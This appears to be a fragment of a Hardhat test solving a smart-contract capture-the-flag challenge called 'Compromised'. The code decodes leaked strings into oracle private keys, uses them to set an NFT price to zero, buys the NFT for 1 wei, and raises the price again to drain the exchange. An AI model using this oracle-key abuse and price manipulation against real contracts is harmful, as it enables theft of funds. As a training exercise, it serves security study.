...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    let oracleWallets = [];
    for (key of leakedKeys) {
      const base64 = Buffer.from(key.split(" ").join(""), "hex").toString(
        "utf8"
      );
      const privKey = Buffer.from(base64, "base64").toString("utf8");
      const oracleWallet = new ethers.Wallet(privKey, ethers.provider);
      oracleWallets.push(oracleWallet);
      await oracle.connect(oracleWallet).postPrice(await nftToken.symbol(), 0);
    }

    const id = await exchange.connect(player).callStatic.buyOne({ value: 1 });
    await exchange.connect(player).buyOne({ value: 1 });

    for (oracleWallet of oracleWallets) {
      await oracle
        .connect(oracleWallet)
        .postPrice(await nftToken.symbol(), EXCHANGE_INITIAL_ETH_BALANCE);
    }
